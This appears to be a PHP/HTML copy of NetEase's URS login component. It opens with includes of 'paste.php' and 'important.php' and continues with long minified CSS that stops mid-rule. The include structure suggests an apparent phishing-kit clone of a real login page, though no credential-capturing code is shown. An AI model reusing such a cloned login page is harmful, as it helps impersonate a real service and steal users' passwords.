<?php include_once("../../paste.php");?>
<?php include_once("../../important.php");?>
<!DOCTYPE html>
<html data-lt-installed="true" id="auto-id-1560941573399"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no">
<title>URS组件</title>
<style type="text/css">
html,body,h1,h2,h3,h4,h5,h6,div,dl,dt,dd,ul,ol,li,p,blockquote,pre,hr,figure,table,caption,th,td,form,fieldset,legend,input,button,textarea,menu{margin:0;padding:0;outline:none;}header,footer,section,article,aside,nav,hgroup,address,figure,figcaption,menu,details{display:block;}table{border-collapse:collapse;border-spacing:0;}caption,th{text-align:left;font-weight:normal;}html,body,fieldset,img,iframe,abbr{border:0;}i,cite,em,var,address,dfn{font-style:normal;}[hidefocus],summary{outline:0;}li{list-style:none;}h1,h2,h3,h4,h5,h6,small{font-size:100%;}sup,sub{font-size:83%;}pre,code,kbd,samp{font-family:inherit;}q:before,q:after{content:none;}textarea{overflow:auto;resize:none;}label,summary{cursor:default;}a,button{cursor:pointer;}h1,h2,h3,h4,h5,h6,em,strong,b{font-weight:normal;}del,ins,u,s,a,a:hover,a:active,a:focus{text-decoration:none;outline:none;}body,textarea,input,button,select,keygen,legend{font:12px/1.14 "Microsoft YaHei","微软雅黑","宋体",helvetica,"Hiragino Sans GB";color:#666;outline:0;}body{cursor:default;}input::-ms-clear,input::-ms-reveal{display:none;}a{color:#666;}button{border:0;}html,body{width:100%;height:auto;margin:0;padding:0;background:none;font-family:"Microsoft YaHei","微软雅黑";}input{width:225px;height:42px;padding-left:0;color:#333;border:0;font-size:16px;font-weight:bold;line-height:42px;}input:-webkit-autofill,textarea:-webkit-autofill,select:-webkit-autofill{-webkit-box-shadow:0 0 0 999px #fff inset;}input::-ms-clear{display:none;}input::-ms-reveal{display:none;}input:focus{border:none;outline:none;*border:0;*outline:0;}a,a:active,a:hover,a:visited{text-decoration:none;}input::-webkit-input-placeholder{font-size:14px;font-weight:normal;color:#bdbdbd;line-height:42px;height:42px;}input::-moz-placeholder{font-size:14px;font-weight:normal;color:#bdbdbd;}input:-ms-input-placeholder{font-size:14px;font-weight:normal;color:#bdbdbd;}input::-o-input-placeholder{font-size:14px;font-weight:normal;color:#bdbdbd;}.f-cb,.f-cbli li{zoom:1;}.f-cb:after,.f-cbli li:after{display:block;clear:both;visibility:hidden;height:0;overflow:hidden;content:".";}.f-ib{display:inline-block;*display:inline-block;*zoom:1;}.f-ff1{font-family:"Microsoft YaHei","微软雅黑","宋体",helvetica,"Hiragino Sans GB";}.f-fs12{font-size:12px;}.f-fs14{font-size:14px;}.f-ib{display:inline-block;*display:inline-block;*zoom:1;}.f-taj{text-align:justify;text-justify:inter-ideograph;}.f-wsn{word-wrap:normal;white-space:nowrap;}.f-pre{overflow:hidden;text-align:left;white-space:pre-wrap;word-wrap:break-word;word-break:break-all;}.f-wwb{white-space:normal;word-wrap:break-word;word-break:break-all;}.f-toe{overflow:hidden;word-wrap:normal;white-space:nowrap;text-overflow:ellipsis;}.f-dn,.f-urs-dn{display:none !important;}.f-fl{float:left;}.f-fr{float:right;}.f-cp{cursor:pointer;}.f-vam,.f-vama *{vertical-align:middle;}.f-du,.f-du:hover{text-decoration:underline;}.f-db{display:block;}.f-vih{visibility:hidden;}.f-viv{visibility:visible;}@-webkit-keyframes flip{0%{-webkit-transform:perspective(2000px) rotateY(0deg);}100%{-webkit-transform:perspective(2000px) rotateY(90deg);}}@-webkit-keyframes flip_out{0%{-webkit-transform:perspective(2000px) rotateY(-90deg);}100%{-webkit-transform:perspective(2000px) rotateY(0deg);}}@keyframes flip{0%{transform:perspective(2000px) rotateY(0deg);}100%{transform:perspective(2000px) rotateY(90deg);}}@keyframes flip_out{0%{transform:perspective(2000px) rotateY(-90deg);}100%{transform:perspective(2000px) rotateY(0deg);}}@-webkit-keyframes shake{0%,100%{-webkit-transform:translateX(0);transform:translateX(0);}10%,30%,50%,70%,90%{-webkit-transform:translateX(-10px);transform:translateX(-10px);}20%,40%,60%,80%{-webkit-transform:translateX(10px);transform:translateX(10px);}}@keyframes shake{0%,100%{-webkit-transform:translateX(0);-ms-transform:translateX(0);transform:translateX(0);}10%,30%,50%,70%,90%{-webkit-transform:translateX(-10px);-ms-transform:translateX(-10px);transform:translateX(-10px);}20%,40%,60%,80%{-webkit-transform:translateX(10px);-ms-transform:translateX(10px);transform:translateX(10px);}}.shake{-webkit-animation-name:shake;animation-name:shake;}@-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translateY(-20px);transform:translateY(-20px);}100%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0);}}@keyframes fadeInDown{0%{opacity:0;-webkit-transform:translateY(-20px);-ms-transform:translateY(-20px);transform:translateY(-20px);}100%{opacity:1;-webkit-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);}}.fadeInDown{-webkit-animation-name:fadeInDown;animation-name:fadeInDown;}@-webkit-keyframes fadeOut{0%{opacity:1;}100%{opacity:0;}}@keyframes fadeOut{0%{opacity:1;}100%{opacity:0;}}.fadeOut{-webkit-animation-name:fadeOut;animation-name:fadeOut;}@-webkit-keyframes zoomIn{0%{opacity:0;-webkit-transform:scale3d(0.3,0.3,0.3);transform:scale3d(0.3,0.3,0.3);}50%{opacity:1;}}@-webkit-keyframes fadeIn{0%{opacity:0;}100%{opacity:1;}}@keyframes fadeIn{0%{opacity:0;}100%{opacity:1;}}.fadeIn{-webkit-animation-name:fadeIn;animation-name:fadeIn;}@-webkit-keyframes bounceIn{0%,100%,20%,40%,60%,80%{-webkit-transition-timing-function:cubic-bezier(0.215,0.61,0.355,1);transition-timing-function:cubic-bezier(0.215,0.61,0.355,1);}0%{opacity:0;-webkit-transform:scale3d(0.3,0.3,0.3);transform:scale3d(0.3,0.3,0.3);}20%{-webkit-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1);}40%{-webkit-transform:scale3d(0.9,0.9,0.9);transform:scale3d(0.9,0.9,0.9);}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03);}80%{-webkit-transform:scale3d(0.97,0.97,0.97);transform:scale3d(0.97,0.97,0.97);}100%{opacity:1;-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1);}}@keyframes bounceIn{0%,100%,20%,40%,60%,80%{-webkit-transition-timing-function:cubic-bezier(0.215,0.61,0.355,1);transition-timing-function:cubic-bezier(0.215,0.61,0.355,1);}0%{opacity:0;-webkit-transform:scale3d(0.3,0.3,0.3);-ms-transform:scale3d(0.3,0.3,0.3);transform:scale3d(0.3,0.3,0.3);}20%{-webkit-transform:scale3d(1.1,1.1,1.1);-ms-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1);}40%{-webkit-transform:scale3d(0.9,0.9,0.9);-ms-transform:scale3d(0.9,0.9,0.9);transform:scale3d(0.9,0.9,0.9);}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);-ms-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03);}80%{-webkit-transform:scale3d(0.97,0.97,0.97);-ms-transform:scale3d(0.97,0.97,0.97);transform:scale3d(0.97,0.97,0.97);}100%{opacity:1;-webkit-transform:scale3d(1,1,1);-ms-transform:scale3d(1,1,1);transform:scale3d(1,1,1);}}.bounceIn{-webkit-animation-name:bounceIn;animation-name:bounceIn;-webkit-animation-duration:0.75s;animation-duration:0.75s;}#_wmswfctner_id{position:absolute;left:0;top:0;}input{background:#fff;}.headimg,.u-closebtn,.u-checkbox,.u-success,.etimg,.third,.ferrortail,.ferrortail2,.ferrortail3,.btn-qrcode,.i-qrsucc,.cap-box .cap-close{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite_61fbe151ab715649c6b7c4ec39156201.png) -9999px -9999px no-repeat;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite8_31811e6b333b8188ed4330196ed09dc9.png) -9999px -9999px no-repeat;}.u-logo-img1,.u-logo-img2,.u-logo-img3,.u-zc-agree-select{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite_61fbe151ab715649c6b7c4ec39156201.png) -9999px -9999px no-repeat;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite8_31811e6b333b8188ed4330196ed09dc9.png) -9999px -9999px no-repeat;}.u-note{padding:0 0 14px 0;}.loading{width:295px;color:#fff;text-align:center;line-height:100%;font-size:14px;height:100%;background-color:#ccc;z-index:9000;position:absolute;top:0;right:0;opacity:0.8;font-weight:700;filter:alpha(opacity = 80);}.loading span{display:none;position:absolute;top:50%;left:50%;margin-top:-30px;margin-left:-80px;}.g-bd{position:relative;width:420px;overflow:hidden;border-radius:4px;background:#fff;}.regManager{padding-top:20px;}.m-header{position:relative;padding:30px 0;}.m-header .headimg{width:150px;height:25px;margin:0 auto;background-position:-16px -28px;}.m-header .line{width:0px;height:20px;border-right:solid 1px #ebedf2;position:absolute;top:50px;}.m-header .u-head1,.m-header .u-head2{width:210px;height:58px;float:left;font-size:18px;text-align:center;border-bottom:solid 1px #ebedf2;line-height:58px;color:#ccc;}.m-header .u-head2{float:right;}.m-header .u-head1.active,.m-header .u-head2.active{color:#000;border-bottom:solid 1px #f53e3a;font-weight:border;}#cnt-box2 .m-header{padding:0;}.u-tab{width:300px;margin:0 auto;padding:0 0 20px 0;}.u-tab .tab0,.u-tab .tab1{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite_61fbe151ab715649c6b7c4ec39156201.png) -9999px -9999px no-repeat;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite8_31811e6b333b8188ed4330196ed09dc9.png) -9999px -9999px no-repeat;float:right;padding:0 0 0 34px;}.u-tab .tab0{background-position:-380px -440px;height:26px;line-height:26px;}.u-tab .tab1{background-position:-380px -380px;height:26px;line-height:26px;}.u-tab .tab0.active{background-position:-380px -478px;}.u-tab .tab1.active{background-position:-380px -410px;}.u-tab .active{color:#f53e3a;}.m-cnt{padding:0 50px;-webkit-user-select:none;}.m-cnt .inputbox{z-index:19;position:relative;height:44px;margin-bottom:0px;border:1px solid #c5cddb;background:#fff;font-size:12px;line-height:44px;}.m-cnt .inputbox2{margin-bottom:0;}.m-cnt .inputbox3{z-index:19;position:relative;margin-bottom:24px;font-size:14px;}.m-cnt .inputbox3 .tip{margin-top:8px;color:#999;}.m-cnt .inputbox3 .mobile{margin-top:24px;font-size:18px;color:#333;}.m-cnt .inputbox.active{border:1px solid #4aafe9;}.m-cnt .inputbox.error-color{border:1px solid #fa6060;}.m-cnt .inputbox.active .m-ferror{display:none;}.m-cnt .u-logo,.m-cnt .u-input,.m-cnt .u-tip{height:100%;}.m-cnt .u-logo{float:left;width:21px;text-align:center;padding:0 5px 0 10px;}.m-cnt .u-logo div{display:inline-block;width:22px;height:24px;margin-top:10px;*display:inline;*zoom:1;}.m-cnt .u-logo .u-logo-img1{background-position:-251px -86px;}.m-cnt .u-logo .u-logo-img2{background-position:-291px -86px;}.m-cnt .u-logo .u-logo-img3{background-position:2px -478px;}.m-cnt .u-sep{float:left;width:0;height:24px;margin-top:8px;border:none;border-left:1px solid #dce2ec;*line-height:0;*border:0;}.m-cnt .u-input{position:relative;float:left;}.m-cnt .u-input .js-mhd-parent{position:initial;}.m-cnt .ckie6{_margin-left:6px;}.m-cnt #password-box{*z-index:10;}.m-cnt #checkcode-box{*z-index:20;}.m-cnt .u-input input{height:42px;line-height:42px;padding-left:8px;}.m-cnt #register-form input.zcemail{width:265px;}.m-cnt #phone-form,.m-cnt #otp-form{height:260px;}.m-cnt .t-appeal{padding-bottom:40px;}.m-cnt .t-appeal a{color:#4cb5ff;}.m-cnt .t-appeal a:hover{color:#4b95ca;}.m-cnt #ppc-form{height:275px;}.m-cnt #ppc-form .m-ppcbox{width:221px;margin:0 auto;padding:25px 0 12px;}.m-cnt #ppc-form .i-card{display:inline-block;*display:inline;*zoom:1;width:32px;border:solid 1px #e5e5e5;margin:0 18px;color:#999;background:#ccc;}.m-cnt #ppc-form .i-card .coord{display:block;height:29px;width:32px;font-size:14px;color:#fff;line-height:29px;text-align:center;}.m-cnt #ppc-form .i-card .coord.clr1{background:#a3c66c;}.m-cnt #ppc-form .i-card .coord.clr2{background:#c64e41;}.m-cnt #ppc-form .i-card .coord.clr3{background:#467ec3;}.m-cnt #ppc-form .i-card .c-ipt{display:block;width:100%;height:32px;font-size:14px;color:#333;line-height:29px;text-align:center;}.m-cnt .u-tip{display:none;float:right;padding:0 10px;}.m-cnt .u-upsms-tip{display:block;}.m-cnt .u-upsms-tip .u-clear{background-position:-60px -89px;}@-webkit-keyframes tada{0%{-webkit-transform:rotate(0);}10%,20%{-webkit-transform:rotate(-9deg);}30%,50%,70%,90%{-webkit-transform:rotate(9deg);}40%,60%,80%{-webkit-transform:rotate(-9deg);}100%{-webkit-transform:rotate(0);}}.m-cnt .u-shake{-webkit-animation:tada 1s 0s ease both;-moz-animation:tada 1s 0s ease both;-ms-animation:tada 1s 0s ease both;-o-animation:tada 1s 0s ease both;animation:tada 1s 0s ease both;}.m-cnt .u-success{display:inline-block;width:20px;height:20px;margin-top:12px;cursor:pointer;vertical-align:top;*display:inline;*zoom:1;}.m-cnt .statusTxt .u-success{margin-top:7px;}.m-cnt .u-suc{background-position:-194px -89px;}.m-cnt .u-clear{background-position:-147px -89px;}.m-cnt .u-eye{background-position:-179px -476px;width:22px;}.m-cnt .eyeactive .u-eye{background-position:-94px -476px;width:22px;}.m-cnt .ie67span{position:relative;*top:10px;_top:0;zoom:1;}.m-cnt #login-form .u-label{width:267px;}.m-cnt #login-form .m-ckcnt .u-label,.m-cnt #login-form .m-ckcnt input.cktext,.m-cnt #login-form .m-mb .u-label{width:130px;}.m-cnt #login-form .m-ckcnt{margin-top:16px;}.m-cnt .slidebox{margin-top:16px;z-index:399;}.m-cnt .u-label{position:absolute;width:306px;z-index:100;top:0;left:10px;color:#bdbdbd;font-size:14px;font-weight:normal;cursor:text;}.m-cnt .pr-domain{height:33px;line-height:33px;color:#616161;font-size:16px;overflow:hidden;display:block;right:-86px;position:absolute;top:5px;background:#fff;white-space:nowrap;}.m-cnt .m-ferror{position:absolute;top:-31px;left:-1px;width:225px;height:37px;color:#fff;border-radius:2px;font-size:0;*top:-40px;}.m-cnt .m-ferror div{display:inline-block;overflow:hidden;*display:inline;*zoom:1;}.m-cnt .m-ferror .ferrorhead{width:auto;height:37px;padding-right:8px;padding-left:32px;color:#999;background-position:0 -340px;font-size:12px;line-height:28px;}.m-cnt .m-ferror .ferrortail{width:3px;height:37px;background-position:0 -421px;*position:relative;*top:0px;}.m-cnt .m-nerror{top:-31px;left:-1px;color:#fff;border-radius:2px;font-size:0;*top:-40px;margin-bottom:0px;margin-top:16px;}.m-cnt .m-nerror a{text-decoration:underline;}.m-cnt .m-nerror div{display:inline-block;overflow:hidden;*display:inline;*zoom:1;}.m-cnt .m-nerror .ferrorhead,.m-cnt .m-nerror .ferrorhead2,.m-cnt .m-nerror .ferrorhead3{width:298px;margin-top:-3px;color:#fa5b5b;font-size:12px;line-height:20px;vertical-align:top;word-break:break-all;}.m-cnt .m-nerror .ferrorhead a,.m-cnt .m-nerror .ferrorhead2 a,.m-cnt .m-nerror .ferrorhead3 a{color:#4aafe9;text-decoration:none;}.m-cnt .m-nerror .ferrorhead2,.m-cnt .m-nerror .ferrorhead3{color:#000;}.m-cnt .m-nerror strong{color:#4aafe9;}.m-cnt .m-nerror .ferrortail,.m-cnt .m-nerror .ferrortail2,.m-cnt .m-nerror .ferrortail3{height:15px;width:18px;background-position:-217px -34px;*position:relative;*top:0;}.m-cnt .m-nerror .ferrortail2{background-position:-316px -33px;}.m-cnt .m-nerror .ferrortail3{background-position:-249px -405px;width:20px;height:16px;}.m-cnt .m-ckcnt{font-size:0;}.m-cnt .m-ckcnt .inputbox{display:inline-block;vertical-align:top;*display:inline;*zoom:1;}.m-cnt .ckin{width:188px;float:left;}.m-cnt #register-form input.cktext{width:130px;}.m-cnt #register-form input.cktext[disabled],.m-cnt input.cktext:disabled{background:none;}.m-cnt .ckimgbox{width:118px;margin-left:10px;text-align:center;}.m-cnt .ckimg{width:118px;height:44px;cursor:pointer;border-radius:2px;line-height:44px;}.m-cnt .m-pccnt .ph-tip{padding:0 0 16px 0px;color:#999;}.m-cnt .m-pcbox{font-size:0;margin-top:16px;}.m-cnt .m-pcbox .u-label{width:176px;}.m-cnt .m-pc{display:inline-block;width:188px;vertical-align:top;*display:inline;*zoom:1;}.m-cnt .m-pc .pcin{width:130px;}.m-cnt .pcbtn{display:inline-block;margin-left:10px;vertical-align:top;*display:inline;*zoom:1;}.m-cnt .pcbtn a{display:block;width:120px;height:46px;text-align:center;color:#fff;font-size:14px;background:#2c82ff;line-height:46px;}.m-cnt .pcbtn a:hover{background:#2c82ff;}.m-cnt .pcbtn a:active{background:#2c82ff;}.m-cnt .pcbtn a.disable,.m-cnt .pcbtn a.disable:hover,.m-cnt .pcbtn a.disable:active{background:#ddd;color:#999;}.m-cnt .un-login,.m-cnt .zc-un-login{width:14px;height:14px;margin:0;opacity:0;-moz-opacity:0;-khtml-opacity:0;filter:alpha(opacity = 0);}.m-cnt .m-etbox{margin-top:-10px;margin-right:-50px;margin-bottom:10px;margin-left:-50px;padding:10px 50px 10px 50px;border-top:1px solid #e6e9f0;border-bottom:1px solid #e6e9f0;background-color:#fafbfd;}.m-cnt .m-etbox .ettip{font-size:0;}.m-cnt .m-etbox .etimgbox{display:inline-block;width:14px;height:18px;margin-top:2px;vertical-align:top;*display:inline;*zoom:1;}.m-cnt .m-etbox .etimg{display:block;width:14px;height:14px;background-position:-320px -275px;}.m-cnt .m-etbox .ettext{display:inline-block;width:300px;margin-left:6px;vertical-align:top;color:#fb493d;font-size:11px;line-height:18px;*display:inline;*zoom:1;}.m-cnt .m-etbox .ettext strong{font-weight:700;color:#2d85be;}.m-cnt .m-etbox .ettext a{cursor:pointer;text-decoration:underline;color:#2c85bf;}.m-cnt .m-unlogin{padding:2px 0 9px 0;font-size:0;height:16px;line-height:16px;}.m-cnt .m-unlogin label,.m-cnt .m-unlogin input{cursor:pointer;}.m-cnt .m-unlogin .b-unlogn{display:block;width:104px;float:left;border-right:solid 1px #ccc;margin-right:8px;}.m-cnt .m-unlogin .b-unlogn .u-checkbox{display:block;float:left;width:14px;height:14px;cursor:pointer;border:solid 1px #aaa;color:#999;font-size:12px;}.m-cnt .m-unlogin .b-unlogn .u-checkbox-select{background-position:-330px -92px;}.m-cnt .m-unlogin .b-unlogn label{display:block;float:left;height:16px;padding-left:8px;font-size:12px;color:#999;line-height:17px;}.m-cnt .m-unlogin .b-unlogn label:hover{color:#666;}.m-cnt .m-unlogin .b-unlogn label:active{color:#666;}.m-cnt .m-unlogin .forgetpwd,.m-cnt .m-unlogin .forgetpwdReg{float:left;height:12px;text-decoration:none;cursor:pointer;color:#999;font-size:12px;line-height:16px;*padding-left:5px;}.m-cnt .m-unlogin .forgetpwd:hover,.m-cnt .m-unlogin .forgetpwdReg:hover{color:#666;}.m-cnt .m-unlogin .u-regbtn{cursor:pointer;font-size:12px;float:right;line-height:16px;}.m-cnt .m-unlogin .u-regbtn.bgcolor{color:#999;}.m-cnt .m-unlogin .u-regbtn.bgcolor:hover{color:#666;}.m-cnt .m-unlogin .u-regbtn.bgcolor:active{color:#666;}.m-cnt .m-unlogin .u-regbtn.bgcolor{color:#999;}.m-cnt .m-unlogin .u-regbtn.bgcolor:hover{color:#666;}.m-cnt .m-unlogin .u-regbtn.bgcolor:active{color:#666;}.m-cnt .m-sug{position:absolute;z-index:1000;top:42px;left:-1px;overflow:hidden;width:318px;border:1px solid #ccc;background:#fafbfd;font-size:12px;}.m-cnt #login-form .m-sug{left:-37px;border-radius:0 0 4px 4px;}.m-cnt .m-sug-ie10{top:40px \0;}.m-cnt .m-sug .itm{height:30px;padding-left:15px;cursor:pointer;color:#909ab0;line-height:30px;}.m-cnt #login-form .m-sug .itm{padding-left:45px;}.m-cnt .m-sug .js-selected{position:relative;height:28px;color:#2e343c;background:#e1eaf1;line-height:28px;}.m-cnt .js-selected .select-tip{position:absolute;display:none;top:0;left:0;width:6px;height:100%;background:#2c85bd;}.u-pwdtext{display:none !important;position:absolute;top:0;left:0;z-index:-1;}.m-ologin{height:26px;text-align:left;color:#9fabbf;}.m-ologin .otip{width:84px;height:26px;font-size:14px;line-height:26px;}.m-ologin .olist{height:26px;margin-left:89px;}.m-ologin .olist div{display:inline-block;vertical-align:top;*display:inline;*zoom:1;}.u-loginbtn{display:block;width:100%;height:44px;cursor:pointer;text-align:center;color:#fff;background:#ddd;font-size:18px;line-height:44px;}.u-loginbtn:hover{color:#fff;}.u-loginbtn:active{color:#edc8c8;}.u-btn-loading{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/loading_50c5e3e79b276c92df6cc52caeb464f0.gif) center center no-repeat !important;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/loading_50c5e3e79b276c92df6cc52caeb464f0.gif) center center no-repeat !important;background-color:#ca5252 !important;opacity:0.7;filter:alpha(opacity = 70);}.loginbox,.unlockbox{margin-bottom:16px;margin-top:16px;}.loginbox{margin-top:16px;margin-bottom:12px;}.u-btn{border-radius:3px;text-align:center;display:block;*display:inline-block;zoom:1;color:#fff;}.u-btn-big{width:320px;height:46px;font-size:20px;line-height:46px;}.u-btn-small{width:200px;height:20px;font-size:12px;line-height:20px;}.u-btn-middle1{margin:16px 0 0 0;width:320px;height:44px;font-size:16px;line-height:44px;display:inline-block;*display:inline-block;*zoom:1;}.u-btn-middle2{margin:0;margin-left:10px;width:114px;height:44px;font-size:16px;line-height:44px;display:inline-block;*display:inline-block;*zoom:1;}.u-btn-middle3{margin:0;width:145px;height:44px;font-size:18px;line-height:44px;text-align:center;border-radius:0;display:inline-block;*display:inline-block;*zoom:1;}.u-btn-bg{display:block;width:108px;height:28px;cursor:pointer;text-align:center;border-radius:2px;font-size:11px;line-height:28px;}.u-btn.bgcolor{color:#999;height:42px;line-height:42px;border:1px solid #999;}.u-btn-tiny{width:110px;height:28px;line-height:28px;border:1px solid #2c85bf;color:#2c85bf;}a.u-btn-tiny:hover{color:#2c85bf;}a.weibo,a.qq,a.weixin,a.yixin,a.renren,a.facebook,a.alipay{display:inline-block;margin:0 4px;cursor:pointer;*display:inline;*zoom:1;}a.weibo{width:22px;height:26px;background-position:-71px -140px;}a.qq{width:18px;height:26px;background-position:-217px -140px;}a.weixin{width:22px;height:26px;background-position:-376px -140px;}a.yixin{width:16px;height:26px;background-position:-71px -188px;}a.alipay{width:23px;height:26px;background-position:-377px -272px;}a.renren{width:18px;height:26px;background-position:-217px -186px;}a.facebook{width:10px;height:26px;background-position:-382px -188px;}a.weibo:hover{background-position:-2px -140px;}a.qq:hover{background-position:-142px -140px;}a.weixin:hover{background-position:-296px -140px;}a.yixin:hover{background-position:-5px -188px;}a.renren:hover{background-position:-142px -186px;}a.alipay:hover{width:23px;height:26px;background-position:-377px -229px;}a.facebook:hover{background-position:-302px -188px;}.cnt-box-include .u-closebtn{display:none;}.u-closebtn{position:absolute;top:16px;right:16px;width:30px;height:30px;cursor:pointer;-webkit-transition:-webkit-transform 0.5s;-moz-transition:-moz-transform 0.5s;-o-transition:-o-transform 0.5s;transition:transform 0.5s;background-position:-99px -85px;}.u-closebtn1{background-position:-99px -85px;}.u-closebtn:hover{-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);-o-transform:rotate(180deg);transform:rotate(180deg);}.m-sep{display:none;height:11px;text-align:center;}.m-sep .leftsep,.m-sep .rightsep{width:165px;height:6px;border-bottom:1px solid #d5dde8;}.m-sep .centertext{height:11px;font-size:11px;line-height:11px;text-align:center;color:#909eb5;}.m-footer{position:relative;padding:12px 50px 28px;}.m-footer .tip{line-height:28px;color:#999;font-size:12px;}.m-footer .m-pccnt{display:none;}.m-footer .m-pcbox{font-size:0;}.m-footer .m-pc{display:inline-block;width:188px;vertical-align:top;*display:inline;*zoom:1;}.m-footer .m-pc .pcin{width:130px;}.m-footer .pcbtn{display:inline-block;margin-left:10px;vertical-align:top;*display:inline;*zoom:1;}.m-footer .pcbtn a{display:block;width:120px;height:42px;text-align:center;color:#fff;background:#2aa8be;font-size:14px;line-height:42px;border-radius:0;}.m-footer .pcbtn a:hover{background:#3fb9ce;}.m-footer .pcbtn a:active{background:#1699b0;}.m-footer .pcbtn .adisable,.m-footer .pcbtn a.disable:hover,.m-footer .pcbtn a.disable:active{background:#ddd;color:#999;}.m-footer #cnt-box{width:420px;overflow:hidden;border-radius:4px;background:#fff;}.m-footer .btn-qrcode{position:absolute;width:54px;height:55px;right:0;bottom:0;background-position:-63px -251px;color:#fff;-webkit-transition:background-position 0.6s ease 0s;-moz-transition:background-position 0.6s ease 0s;-ms-transition:background-position 0.6s ease 0s;-o-transition:background-position 0.6s ease 0s;transition:background-position 0.6s ease 0s;border-radius:100px 0 0 0;}.m-footer .btn-qrcode.pc{background-position:-10px -304px;}.fur-vip{position:absolute;top:147px;left:50px;z-index:999;width:320px;height:230px;background:url(//urswebzj.nosdn.127.net/webzj_cdn101/vip_94b2cc6d3f2f37bb5103c84095f23c14.jpg) 0 0 no-repeat;}.fur-vip .btn-vip{top:153px;left:114px;position:absolute;border:solid 1px #afa96d;border-radius:3px;width:100px;height:30px;font-size:13px;color:#afa96d;text-align:center;line-height:30px;}.u-zc-agree{display:block;float:left;margin-right:5px;width:14px;margin-top:3px;height:14px;cursor:pointer;border:solid 1px #aaa;color:#999;font-size:12px;}.u-zc-agree .zc-un-login{cursor:pointer;}.u-zc-agree-select{background-position:-330px -92px;}.fur-agree{color:#999;}.fur-agree a{color:#999;text-decoration:none;line-height:20px;}.fur-agree a:hover{color:#666;}.fur-btn-agree{width:16px;height:16px;position:relative;top:3px;}.fur-reg-success0,.fur-reg-success1,.fur-reg-success2{width:88px;height:88px;margin:46px auto 24px;background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sp_1873dafc7406a2973ac649387526ca17.png) -9999px -9999px no-repeat;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sp8_6230cee07d1f53f9e8d3118bca269bd6.png) -9999px -9999px no-repeat;}.fur-reg-success0{background-position:0 0;}.fur-reg-success1{background-position:0 -206px;}.fur-reg-success2{background-position:0 -363px;}.fur-item{position:relative;}.u-logbtn{cursor:pointer;font-size:12px;float:right;margin-top:14px;position:relative;z-index:999;}.u-logbtn.bgcolor{color:#999;}.u-logbtn.bgcolor:hover{color:#666;}.u-logbtn.bgcolor:active{color:#666;}.u-logbtn.bgcolor{color:#999;}.u-logbtn.bgcolor:hover{color:#666;}.u-logbtn.bgcolor:active{color:#666;}.page-sms .loginbox{padding-bottom:64px;}.page-sms .goback{text-align:right;}.page-sms .goback .backToReg{font-size:14px;color:#5084cb;}.page-sms .small-note{font-size:12px;margin-bottom:15px;color:#9fabbf;}.page-sms .head-note{font-size:14px;color:#000;height:46px;line-height:46px;}.page-sms .smserror2{display:inline-block;width:300px;margin-left:6px;vertical-align:top;font-size:11px;line-height:18px;color:#000;}.page-sms .smserror2 strong{font-weight:700;color:#2d85be;}.m-qrcode{position:relative;color:#333;}.m-qrcode .m-goregqr{text-align:center;}.m-qrcode .m-goregqr a{color:#5584ff;}.m-qrcode .i-qrcode{display:block;width:144px;height:144px;margin:0 auto;padding-top:34px;line-height:160px;text-align:center;color:#aaa;}.m-qrcode .i-qrsucc{margin:0 auto;height:141px;width:151px;background-position:-139px -225px;margin-top:14px;}.m-qrcode .tlt{position:absolute;top:-30px;width:100%;font-size:20px;text-align:center;left:0;}.m-qrcode .warn{position:absolute;padding:50px 0;width:163px;top:23px;left:78px;line-height:32px;background:#f0f0f0;background:rgba(240,240,240,0.8);margin:0 auto;text-align:center;cursor:pointer;font-size:18px;font-weight:bold;}.m-qrcode .subtlt{display:block;text-align:center;font-size:14px;padding:20px 0;}.m-qrcode .subtlt a{color:#5584ff;}.m-qrcode .subtlt a:hover{color:#9cb4f5;}.m-qrcode .subtlt.tip{padding:25px 0 40px 0;}.m-qrcode .subtlt.succ{padding-top:21px;font-size:16px;}.m-qrcode .qrback{display:block;width:120px;margin:0 auto;text-align:center;font-size:14px;padding-top:29px;}.m-qrcode .qrback:hover{color:#4db5ff;}.captcha{position:absolute;background-color:#fff;top:50%;left:50%;z-index:999;border:solid 1px #ccc;width:438px;height:138px;border-radius:5px;margin-left:-219px;margin-top:-134px;box-shadow:0 0 5px #ccc;padding:56px 0 74px 0;}.captcha .inner-cnt{width:320px;margin:0 auto;}.captcha .m-ckcnt{width:320px;margin:0 auto;}.captcha .m-ckcnt .loginbox{margin-bottom:0;margin-top:0;}.captcha .fur-submit,.captcha2 .fur-submit{position:relative;}.captcha .fur-notice,.captcha2 .fur-notice{display:none;}.captcha .fur-item,.captcha2 .fur-item{font-size:16px;color:#2e343c;width:320px;margin:0 auto;padding-bottom:10px;}.captcha .fur-sms-captcha,.captcha2 .fur-sms-captcha{width:320px;margin:0 auto;}.captcha .fur-btn,.captcha2 .fur-btn{width:320px;margin:0 auto;}.captcha .captcha-btn0,.captcha2 .captcha-btn0{width:194px;margin:0;}.captcha .captcha-btn1,.captcha2 .captcha-btn1{width:114px;background:#fff;color:#536586;height:40px;line-height:40px;border-radius:5px;font-size:16px;text-align:center;cursor:pointer;position:absolute;right:0;top:0;border:solid 1px #9fabbf;border-radius:5px;display:block;}.fur-change-email{position:relative;width:320px;height:16px;line-height:16px;font-size:12px;}.fur-change-email 